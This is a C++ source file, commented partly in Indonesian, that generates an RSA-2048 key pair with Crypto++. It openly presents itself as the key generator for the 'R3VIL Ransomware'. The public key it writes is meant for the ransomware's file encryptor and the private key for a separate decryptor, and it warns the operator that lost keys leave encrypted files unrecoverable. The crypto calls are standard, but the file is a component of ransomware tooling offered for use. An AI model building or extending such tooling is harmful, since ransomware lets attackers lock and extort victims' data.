// generate.cpp - RSA Key Pair Generator for R3VIL Ransomware
// Compile: g++ -std=c++17 -o generate generate.cpp -lcryptopp -O2

#include <cryptopp/cryptlib.h>
#include <cryptopp/rsa.h>
#include <cryptopp/osrng.h>
#include <cryptopp/files.h>
#include <cryptopp/hex.h>

#include <iostream>
#include <string>
#include <filesystem>

using namespace CryptoPP;
namespace fs = std::filesystem;

int main() {
    std::cout << "========================================\n";
    std::cout << "     R3VIL RSA KEY GENERATOR            \n";
    std::cout << "========================================\n\n";

    try {
        std::cout << "[*] Generating RSA-2048 key pair...\n";
        std::cout << "[!] This may take a few seconds...\n\n";

        AutoSeededRandomPool rng;

        // Generate Private Key (2048 bit - cukup kuat untuk demo)
        RSA::PrivateKey privateKey;
        privateKey.GenerateRandomWithKeySize(rng, 2048);

        RSA::PublicKey publicKey(privateKey);

        // Simpan Public Key dalam format DER (yang dibaca r3vil.cpp)
        FileSink publicFile("rsa_public.der", true);
        publicKey.Save(publicFile);
        publicFile.MessageEnd();

        // Simpan Private Key dalam format DER (yang dibaca revkey.cpp)
        FileSink privateFile("rsa_private.der", true);
        privateKey.Save(privateFile);
        privateFile.MessageEnd();

        // Tampilkan informasi
        std::cout << "[✓] RSA Key Pair berhasil dibuat!\n\n";
        std::cout << "File yang dihasilkan:\n";
        std::cout << "   • rsa_public.der   (untuk enkripsi di r3vil)\n";
        std::cout << "   • rsa_private.der  (untuk dekripsi di revkey)\n\n";

        std::cout << "Modulus size : " << publicKey.GetModulus().BitCount() << " bits\n";
        std::cout << "Public Exponent : " << publicKey.GetPublicExponent() << "\n\n";

        std::cout << "[!] Simpan rsa_private.der di tempat yang AMAN!\n";
        std::cout << "    Jika hilang, file yang terenkripsi tidak bisa dipulihkan.\n";

        // Optional: Tampilkan ukuran file
        if (fs::exists("rsa_public.der"))
            std::cout << "   rsa_public.der  size: " << fs::file_size("rsa_public.der") << " bytes\n";
        if (fs::exists("rsa_private.der"))
            std::cout << "   rsa_private.der size: " << fs::file_size("rsa_private.der") << " bytes\n";

    }
    catch (const CryptoPP::Exception& e) {
        std::cerr << "\n[!] Crypto++ Exception: " << e.what() << std::endl;
        return 1;
    }
    catch (const std::exception& e) {
        std::cerr << "\n[!] Error: " << e.what() << std::endl;
        return 1;
    }

    std::cout << "\n========================================\n";
    std::cout << "Key generation completed successfully.\n";
    std::cout << "========================================\n";

    return 0;
}
